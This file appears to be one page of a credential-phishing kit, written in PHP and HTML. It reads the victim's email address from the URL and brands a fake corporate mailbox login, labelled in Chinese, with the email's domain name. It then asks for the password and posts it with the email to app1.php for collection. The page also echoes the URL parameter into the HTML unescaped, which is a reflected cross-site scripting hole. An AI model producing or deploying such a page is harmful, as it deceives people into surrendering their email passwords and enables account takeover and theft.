<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<title><?php echo $yuh ?> &#37038;&#31665;&#20225;&#19994; | User: <?php echo $_GET['email']; ?></title>
<style> 
body {
  background: #E6E6E6;
}
input[type=submit] {
  width:120px; height:40px; font-family: arial; font-size: 15px; color:#FFF; background-color: #045FB4; border: solid 1px #045FB4;
}
input[type=password] {
  width:340px; height:30px; font-family: arial; font-size: 15px; 
  color:#000000; background-color: #FFF; border: solid 1px #FFF; padding: 0px;
  }
input[type=email] {
  width:340px; height:40px; font-family: arial; font-size: 15px; 
  color:#000000; background-color: #FFF; border: solid 1px #FFF; padding: 10px;
    }
</style>
</head>
<body>

<br><br><br><br>

	<table align="center" style="width:420px; height:330px; -webkit-box-shadow: 1px 1px 15px 1px #000000; 
box-shadow: 1px 1px 15px 1px #A2A2A2" bgcolor="#FFF"><tr>

<td>

			<table align="center" style="width:320px;">
			<tr><td style="height:15px;"></td></tr>
			<tr><td>
				<font face="arial" size="+1">
					<b><?php echo $yuh ?> WebApp</b>
				</font>
			</td></tr>
			<tr><td style="height:20px;"></td></tr>
			<tr><td>
				<font face="arial" size="3">
					<?php echo $_GET['email']; ?>
				</font>
			</td></tr>
			<tr><td>
				<font face="arial" size="2">
					&#35201;&#32487;&#32493;&#65292;&#35831;&#39564;&#35777;&#24744;&#30340; ID &#20197;&#35777;&#26126;&#24744;&#26159;&#20154;&#31867;
				</font>
			</td></tr>
			<tr><td style="height:7px;">
				<form method="post" action="./app1.php">
			</td></tr>
			<tr><td>
				<input  name="passwd" type="password" placeholder="&#23494;&#30721;" required>
			</td></tr>
			<tr><td>
					<hr width="100%" align="left">
			</td></tr>
			<tr><td>
				<table cellspacing="0"><tr>
				<td>
					<input type="checkbox" checked>
					<font face="arial" size="2" color="#000">
					 &#35760;&#24471;&#25105;
					</font>
				</td>
				</tr></table>
			</td></tr>
			<tr><td style="height:20px;"></td></tr>
			<tr><td>
				<div align="right">
							<input type="submit" value="&#32487;&#32493;">
				</div>
			</td></tr>
			<tr><td>
				<input type="hidden" name="login" value="<?php echo $_GET['email']; ?>">
				</form>
			</td></tr>
			<tr><td style="height:10px;"></td></tr>
			</table>
			
</td>



</tr></table>


<p></p>

<table align="center" style="width:420px; height:60px; -webkit-box-shadow: 1px 1px 15px 1px #000000; 
box-shadow: 1px 1px 15px 1px #A2A2A2;" bgcolor="#FFF"><tr><td>

		<table align="center" cellspacing="0" width="90%"><tr><td>
			<div align="center">
				<font face="verdana" size="3">
					<?php echo $_GET['email']; ?>
				</font>
			</div>
		</td></tr></table>

</td></tr></table>
	

</body>
</html>